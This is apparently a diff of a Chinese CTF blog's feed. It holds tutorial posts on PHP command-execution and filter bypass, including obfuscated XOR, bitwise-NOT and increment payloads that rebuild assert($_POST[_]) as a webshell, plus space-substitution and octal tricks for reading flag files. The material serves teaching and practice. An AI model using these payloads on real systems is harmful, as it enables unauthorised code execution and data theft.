-<p>  &emsp;&emsp;下面的方法专门针对单独过滤情况。  </p>
-<h5 id="利用Linux的环境变量和区间取值"><a href="#利用Linux的环境变量和区间取值" class="headerlink" title="利用Linux的环境变量和区间取值"></a>利用Linux的环境变量和区间取值</h5><p>&emsp;&emsp;在Linux中PATH是默认系统环境变量，我们可以使用特殊的调用方法，来提取相应的字符，每个字符对应一个下标，从0开始，跟数组一样。但有限，论好用还得是区间取值。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> f<span class="variable">$&#123;PATH:5:1&#125;</span><span class="variable">$&#123;PATH:8:1&#125;</span><span class="variable">$&#123;PATH:72:1&#125;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;区间取值就是顾名思义，用[]框起来表示范围，然后让Linux自行匹配。顺带提一句，八进制也可以执行。</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">more <span class="selector-attr">[d-h]</span><span class="selector-attr">[k-m]</span><span class="selector-attr">[9-z]</span><span class="selector-attr">[e-h]</span></span><br><span class="line">$<span class="string">&#x27;\143\141\164&#x27;</span> $<span class="string">&#x27;\146\154\141\147&#x27;</span>  <span class="comment">//cat flag</span></span><br></pre></td></tr></table></figure>
-<p><img data-src="/images/PATH.png" alt="PATH"></p>
-<h4 id="无字母数字绕过"><a href="#无字母数字绕过" class="headerlink" title="无字母数字绕过"></a>无字母数字绕过</h4><p>&emsp;&emsp;上面那个只是过滤了一些特定字符，而这种不仅过掉了所有字母，还有数字。那该怎么办呢，还有符号呢！！！我们只需构造出新的变量就可以跑去那边shell了。统一构造<code>assert($_POST[])</code>。而不能使用的字符数字我们可以使用<code>URL 编码</code>绕过。<font color=black>注：针对php5版本，在学web的时候，要对版本很敏感，不同的版本有不同的特性和方法。</font></p>
-<h5 id="异或运算绕过"><a href="#异或运算绕过" class="headerlink" title="异或运算绕过"></a>异或运算绕过</h5><p>&emsp;&emsp;异或^就是两位对象转成二进制0和1相比较，<font color=pink>相同为零，不同为1。</font>根据上面所说的，则有a:’%40’^’%21’ ; s:’%7B’^’%08’ ; s:’%7B’^’%08’ ; e:’%7B’^’%1E’ ; r:’%7E’^’%0C’ ; t:’%7C’^’%08’; P:’%0D’^’%5D’ ; O:’%0F’^’%40’ ; S:’%0E’^’%5D’ ; T:’%0B’^’%5F’<br>&emsp;&emsp;拼接起来就为：</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);<span class="variable">$___</span>=$<span class="variable">$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="regexp">//</span>assert(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp; 然后POST那边就可以命令执行了，例如<font color=blue>_&#x3D;system(“cat flag.php”)</font></p>
-<h5 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h5><p>&emsp;&emsp;取反~就是assert和_POST取反（废话），就不多说了，直接上payload</p>
-<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;它还有一种方法，就是文字取反，感兴趣的可以去搜搜。它的payload有点长，可以先去本地试一下。</p>
-<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">%24_%2B%2B%3B%24__%20%3D%20%22%E6%9E%81%22%3B%24___%20%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8C%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%9A%AE%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8D%81%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8B%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24____%20%3D%20<span class="string">&#x27;_&#x27;</span>%3B%24__%20%3D%20%22%E5%AF%B8%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%B0%8F%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E6%AC%A0%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%AB%8B%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24_%20%3D%20%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br></pre></td></tr></table></figure>
-
-<h5 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h5><p>&emsp;&emsp;原理就是, 嗯……，直接看其他师傅的吧：<a href="https://www.cnblogs.com/pursue-security/p/15404150.html">无字母数字</a>，他那边的payload跟我的是一样，甚至前面还有源码和解释。</p>
-<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B<span class="string">&#x27;!&#x27;</span>%3D%3D<span class="string">&#x27;%40&#x27;</span>%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D<span class="string">&#x27;_&#x27;</span>%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br></pre></td></tr></table></figure>
-
-<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>&emsp;&emsp;你已经划到这了，我就默认你看完了哈。恭喜你，已经学了很多知识了，当然还有更多的知识等着你，不知道你有没有看完另外两大知识点呢——&gt;文件包含，文件上传。这三个统称为WEB三巨头，后面还有SQL，SSTI，反序列等知识期待你来学，别着急，慢慢来。 ( ੭ ˙ᗜ˙ )੭</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息收集（CTF基础篇）</title>
-    <url>/2024/07/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88CTF%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/</url>
-    <content><![CDATA[<p>&emsp;&emsp;信息收集作为CTF最常用的手段（直接给源码的不算），常规思路有<br><font color=black><br>ctrl+U 查看源代码<br>F12  查看js脚本<br>robots.txt 文件泄露,在URL后面加上&#x2F;robots.txt,可能会给出flag或所在路径<br><a href="http://www.zip/">www.zip</a>   压缩包，同上用法<br>dirsearch   扫描文件，转至<a href="/2024/07/23/dirsearch/">dirsearch</a><br>BurpSuite  抓包找响应头，转至<a href="/2024/07/25/BurpSuite/">BurpSuite</a><br></font><br>&emsp;&emsp;基本思路就这些，剩下的就靠你的搜索能力了( ੭ ˙ᗜ˙ )੭</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
       </tags>
   </entry>
   <entry>
@@ -582,6 +479,118 @@
       <tags>
         <tag>注入</tag>
         <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息收集（CTF基础篇）</title>
+    <url>/2024/07/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88CTF%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/</url>
+    <content><![CDATA[<p>&emsp;&emsp;信息收集作为CTF最常用的手段（直接给源码的不算），常规思路有<br><font color=black><br>ctrl+U 查看源代码<br>F12  查看js脚本<br>robots.txt 文件泄露,在URL后面加上&#x2F;robots.txt,可能会给出flag或所在路径<br><a href="http://www.zip/">www.zip</a>   压缩包，同上用法<br>dirsearch   扫描文件，转至<a href="/2024/07/23/dirsearch/">dirsearch</a><br>BurpSuite  抓包找响应头，转至<a href="/2024/07/25/BurpSuite/">BurpSuite</a><br></font><br>&emsp;&emsp;基本思路就这些，剩下的就靠你的搜索能力了( ੭ ˙ᗜ˙ )੭</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>命令执行</title>
+    <url>/2024/07/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<p>&emsp;&emsp;命令执行可以说是贯彻整个比赛的要点，不然你发现漏洞了都不知道怎么提取flag，别告诉我你只会F12，ctrl+U找(๑‾᷅^‾᷅๑)</p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>&emsp;&emsp;这类知识点主要靠对函数和命令的熟练度和扩展度，能达成目的的方法不止一步，要掌握常见的函数和文件读取的命令，同时要学会如何利用一些特性去绕过黑名单。推荐去B站看橙子科技的视频，那里不止有命令执行的，希望对你有帮助。</p>
+<h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>&emsp;&emsp;最常用的也是最好用的函数，通常能用system了就代表里找到flag不远了，最常规的用法就是<font color=blue>system(“ls”);</font>确认一下flag所在文件名，然后<font color=blue>system(“cat flag.php”);</font>注意：大多数情况下分号也是不能少的，因为这是一条语句。<br>&emsp;&emsp;当然也会出现找不到flag的现象，我们可以用<font color=red>system(“ls &#x2F;“);</font>去根目录找，也可以<font color=red>system(“env”);</font>调用环境变量去找，注意：有的题目flag所在的文件名不是flag.php，去找相类似的，或者很长很怪的文件名去试。在不济，就使用一句话木马连接蚁剑去翻，详情去木马那一章去看。</p>
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>&emsp;&emsp;exec通常有两个参数，exec($command,$output),第一个参数输入要执行的命令，作为单独使用时只有最后一行的结果，且不会回显；第二个参数是将命令执行的输出填充此数组，逐行填充数组（二维数组），用法：使用var_dump或 print_r输出output里面的$变量。 例如：<font color=blue>print_r($output);</font></p>
+<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>&emsp;&emsp;一个参数，输入要执行的命令，会输出二进制的数据，并直接回显，且回显的是正常数据，和system一样好用，例如：<font color=blue>passthru(“ls”);</font></p>
+<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p>&emsp;&emsp;看到exec就要想到这是不回显的，但是区别就是它只有一个参数,用一个变量去接它，然后使用echo和print等输出结果，例如：<font color=red>$output &#x3D; shell_exec(‘ls’); echo $output;</font>  </p>
+<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号` `"></a>反引号` `</h4><p>&emsp;&emsp;这个同shell_exec一样，也是用echo和print输出结果，它需要跟单引号‘’分清楚，反引号在数字1的左边那个才是，弄错了输出的结果肯定也不一样。建议自己去试一下。<br><img data-src="/images/%E5%8F%8D%E5%BC%95%E5%8F%B7.png" alt="反引号"> </p>
+<h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><p>&emsp;&emsp;两个参数popen($command,$mode),第一个参数输入命令，第二参数为模式，’r’表示阅读，’w’表示写入。同上面不同的是，有个open，这个有关文件，所以要先用fgets读取再用print_r输出，例如：  </p>
+<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">popen</span>($command,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>($output=fgets($a))</span><br><span class="line">&#123;</span><br><span class="line">    print_r($output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;fgets只读取一行，因此需要靠循环遍历。这个不常遇到，可以先了解一下。</p>
+<h3 id="常见文件读取命令"><a href="#常见文件读取命令" class="headerlink" title="常见文件读取命令"></a>常见文件读取命令</h3><p>&emsp;&emsp;下面的命令建议打开你的kali或者linux去实践一下，印象更深更明白。在web下，要跟上面的函数搭配使用才是正解。  </p>
+<h4 id="ls和cat"><a href="#ls和cat" class="headerlink" title="ls和cat"></a>ls和cat</h4><p>&emsp;&emsp;最常用的一组命令，dddd  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /</span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>
+
+<h4 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h4><p>&emsp;&emsp;与cat功能类似，只不过是反向显示（从表面上看就知道，就是cat的reverse）。例如：<font color=bule>tac flag.txt</font></p>
+<h4 id="more和less"><a href="#more和less" class="headerlink" title="more和less"></a>more和less</h4><p>&emsp;&emsp;more:一页一页的输出，等同cat，区别自己实践一下。<br>&emsp;&emsp;less: 同上。  </p>
+<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">more flag.php</span><br><span class="line"><span class="keyword">less</span> flag.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h4><p>&emsp;&emsp; 显示文件的最后几行（默认显示最后10行），例如：<font color=red>tail flag.php</font>  </p>
+<h4 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h4><p>&emsp;&emsp;显示的时候，顺便输出行号,例如：<font color=blue>nl flag.php</font></p>
+<h4 id="od和xxd"><a href="#od和xxd" class="headerlink" title="od和xxd"></a>od和xxd</h4><p>&emsp;&emsp;od:以二进制的方式读取档案内容<br>&emsp;&emsp;xxd:读取二进制文件,很显然，有二进制，通常和passthru进行搭配使用</p>
+<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="language-bash">=passthru(<span class="string">&quot;od -A d -c flag.php&quot;</span>);</span></span><br><span class="line">?<span class="keyword">cmd</span><span class="language-bash">=passthru(<span class="string">&quot;xxd flag.php&quot;</span>);</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/images/xxd.png" alt="xxd"></p>
+<h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p>&emsp;&emsp;主要用于排序文件，但也能达成目的，例如:<font color=red>sort flag.txt</font></p>
+<h4 id="uniq-file-f-grep"><a href="#uniq-file-f-grep" class="headerlink" title="uniq | file -f | grep"></a>uniq | file -f | grep</h4><p>&emsp;&emsp;uniq:报告或删除文件中重复的行<br>&emsp;&emsp;file -f:报错出具体内容<br>&emsp;&emsp;grep:在文本中查找指定的字符串<br><img data-src="/images/grep.png" alt="grep"></p>
+<h3 id="操作系统链接符"><a href="#操作系统链接符" class="headerlink" title="操作系统链接符"></a>操作系统链接符</h3><h4 id=""><a href="#" class="headerlink" title=";"></a>;</h4><p>&emsp;&emsp;这个应该都知道，代表这条语句的结束，后面可以继续跟命令，可以使多个命令按顺序执行，自行去kali试一下，如果php中遇到过滤，可以用?&gt;代替，它代表着代码的结束。例如<font color=red>id;ls;pwd</font></p>
+<h4 id="-1"><a href="#-1" class="headerlink" title="&amp;"></a>&amp;</h4><p>&emsp;&emsp;一样的效果，使命令在后台运行，这样就可以同时执行多条命令，注意在GET传参的时候<code>必须URL编码</code>,&amp;的URL为%26。例如<font color=blue>?c&#x3D;ls%26cat flag.php</font></p>
+<h4 id="-2"><a href="#-2" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h4><p>&emsp;&emsp;和逻辑与的语法一样，两边为命令的时候，前面的命令执行成功才会执行后面的命令，反之则不会执行后面的命令，同上，<code>必须URL编码</code>,例如<font color=red>?c&#x3D;ls%26%26cat flag.php</font></p>
+<h4 id="-3"><a href="#-3" class="headerlink" title="|"></a>|</h4><p>&emsp;&emsp;将前面命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数；是不是看起来有点生涩？没关系，看个例题就明白了。<br>&emsp;&emsp;<font color=blue>echo “ls -l”</font>这个是只显示”ls -l”,而不是命令。<br>&emsp;&emsp;<font color=red>echo “ls -l” | &#x2F;bin&#x2F;bash</font>这个是&#x2F;bin&#x2F;bash把”ls -l”当成参数执行，也就是执行了ls -l这条命令。  </p>
+<h4 id="-4"><a href="#-4" class="headerlink" title="||"></a>||</h4><p>&emsp;&emsp;继承了逻辑或的语法，还有短路原则，换个更容易理解的就是相当于if else语句，若前面的命令执行成功，后面的命令就不会执行，反之执行后面的命令；例如<br>&emsp;&emsp;<font color=blue>ls || &gt;dev&#x2F;null 2&gt;&amp;1</font>后者相当于一个垃圾桶，你的所有输出都会被丢进去,”&gt;”代表的是重定向，还有2和1具体代表什么感兴趣的可以再去看一下，目前只要知道这样的格式代表的是垃圾桶就好。好，回归正题，如果没有||，作为顺序输出的话，就不会有回显；反之，ls正常输出，后面就不会执行了。</p>
+<h4 id="无参数命令执行"><a href="#无参数命令执行" class="headerlink" title="无参数命令执行"></a>无参数命令执行</h4><p>&emsp;&emsp;通俗来说就是函数里面没有有参数，比如phpinfo()是不是，里面没有参数照样能用，那么一些能利用的函数有哪些呢？？？</p>
+<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="built_in">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>])<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;像是正则里面的那两个就代表过滤了参数，就只能使用无参了。</p>
+<h5 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h5><p>&emsp;&emsp;返回所有已定义的<font color=yellow>变量的值</font>,然后对应成数组（注：如果有多个请求方法，返回数组的顺序为GET-&gt;POST-&gt;COOKIE-&gt;FILES），例如：定义了<font color=pink>cmd&#x3D;system(“ls”);</font>那么执行<font color=black>print_r(get_defined_vars());</font>时，将会回显<font color=red>[cmd]&#x3D;&gt;system(“ls);</font>这是我们就可以用<font color=green>pos来提取出参数里面的值system(“ls”)</font>,什么，你说没有变量怎么办？笨蛋，不知道自己编一个吗？我们可以这样</p>
+<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">?code=print_r(<span class="keyword">end</span>(pos(get_defined_vars())));<span class="variable">&amp;cmd</span>=<span class="meta">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;注意只要后面的那个变量，用end提取(别问，问就是code我们也算变量啵，定义了两个变量就有两个数组，我们用后面那个cmd的)，这样就可以输出system(“ls”);同理，我们只要把print_r换成eval,assert就可以执行命令了，所以payload通常是:</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?code=<span class="keyword">assert</span>(<span class="keyword">end</span>(pos(get_defined_vars())));&amp;cmd=<span class="keyword">system</span>(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+
+<h5 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h5><p>&emsp;&emsp;不解释了，看图<br><img data-src="/images/%E5%A4%A7%E6%9D%82%E7%83%A9.png" alt="scandir"><br>&emsp;&emsp;用法：</p>
+<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">localeconv</span>()); <span class="comment">//查看当前目录文件名，形式同get_defined_vars的排列一样</span></span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">current</span>(<span class="title">localeconv</span>())); <span class="comment">// 同pos，读取第一个数组的值</span></span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>()))); <span class="comment">//读取当前目录（第一个数组所在目录）下的文件名</span></span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">aray_reverse</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())))); <span class="comment">//同<span class="doctag">end</span>的作用，如果flag在最后一个，倒转使它变成第一个，再用current对向它，show_source进行回显</span></span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;那么最终的payload就为：</p>
+<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">?code=show_source(<span class="literal">current</span>((aray_reverse(scandir(<span class="literal">current</span>(localeconv()))))))<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;同理，getcwd()也可以达成目的，那么另一种的payload就为：</p>
+<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">?<span class="meta">code</span><span class="symbol">=show_source</span>(<span class="meta">end</span>(scandir(getcwd())))<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;对照上面的函数，我们还可以用读取上一级目录的随机文件名(直到随机到flag即可)，payload如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?code=show_source(array_rand(array_flip(scandir(<span class="built_in">dirname</span>(<span class="built_in">chdir</span>(<span class="built_in">dirname</span>(getcwd())))))));</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;payload不是一成不变的，根据题目使用实用的函数，看你的熟练度如何了。<br>&emsp;&emsp;推荐博客：<a href="https://blog.csdn.net/2301_76690905/article/details/133808536">无参RCE</a><br>&emsp;&emsp;推荐视频: <a href="https://www.bilibili.com/video/BV1tG4y1c7Vb/?spm_id_from=333.999.0.0&vd_source=fb821c5d64cc54f5e03e8f0c7ecb5672">橙子科技</a></p>
+<h5 id="session-start"><a href="#session-start" class="headerlink" title="session_start()"></a>session_start()</h5><p>&emsp;&emsp;这个难度系数有点高，可以自己去看视频实践一下，平常情况不推荐使用，失误率也蛮大的。</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="替换函数绕过"><a href="#替换函数绕过" class="headerlink" title="替换函数绕过"></a>替换函数绕过</h4><p>&emsp;&emsp;之所以介绍这么多常见的命令和函数就是为了达成这个目的，看黑名单内没有其中的哪些（个）函数和命令就可以用它实现一样的效果。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/exec/system/popen/proc_open|\`/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;很明显，对照上面的函数，还有passthru没有过滤，就可以使用该函数，<font color=blue>?c&#x3D;passthru(“ls”);</font></p>
+<h4 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h4><p>&emsp;&emsp;空格过滤是属于比较烦的一种，尤其在SQL注入中┻┻︵⁞&#x3D;༎ຶ﹏༎ຶ&#x3D;⁞︵┻┻，算了，我们先看这里的。</p>
+<h5 id="大括号"><a href="#大括号" class="headerlink" title="大括号{}"></a>大括号{}</h5><p>&emsp;&emsp;顾名思义就是用大括号将命令括起来，中间用，分割，例如<font color=red>{cat,flag.txt};</font>  </p>
+<h5 id="IFS-代替空格"><a href="#IFS-代替空格" class="headerlink" title="$IFS 代替空格"></a>$IFS 代替空格</h5><p>&emsp;&emsp;这个建议去kali用一下，原理就是Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符，既然是分隔符，就能起到空格的作用。通常能单纯的$IFS会被当作变量名，就加一对{}固定变量名所以就是${IFS}，例如<font color=blue>ls${IFS}-l</font><br>&emsp;&emsp;再者就是$IFS$9，后面加个$和{}类似，起截断作用，$9是当前系统shell进程的第九个参数，代表这空字符串，所以这也是一种,例如<font color=red>ls$IFS$9-l</font><br>&emsp;&emsp;这两个在题目中最常用也最好用了，要知道。  </p>
+<h5 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h5><p>&emsp;&emsp;就是使用空格和制表符的URL编码代替空格，在执行是会自动转换为空格使用，%09（tab）%20（space），例如<font color=blue>cat%09flag.php</font>和<font color=red>cat%20flag.php</font></p>
+<h5 id="重定向字符"><a href="#重定向字符" class="headerlink" title="重定向字符&lt;,&lt;&gt;"></a>重定向字符&lt;,&lt;&gt;</h5><p>&emsp;&emsp;上面也提过一嘴，就是把&lt;后面跟的文件取代键盘作为新的输入设备，具体原理我也不清楚（谁会了到时候指导我一下ヾ(❀╹◡╹)ﾉﾞ❀~），不推荐使用，用法1：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span>&lt;flag.php</span><br><span class="line"><span class="built_in">cat</span>&lt;&gt;flag.php</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;而这另一种用法较为广泛，例如题目中出现类似与shell_exec()这种函数没有回显的情况下，我们可以用重定向，将结果放入指定的文件中,用法2:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> / &gt; 1.txt</span><br><span class="line"><span class="built_in">cat</span> /flag &gt; 2.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="特定字符过滤绕过"><a href="#特定字符过滤绕过" class="headerlink" title="特定字符过滤绕过"></a>特定字符过滤绕过</h4><p>&emsp;&emsp;这种过滤一般针对一些特定的字符，全过滤的在后面，比如flag这四个，或者f,l,a,g四个字符单独过滤，后者意味这不能有这四个字母的出现，前者只是它们不能连着，很显然，后者相对难处理些，那么，就看看有哪些方法吧。</p>
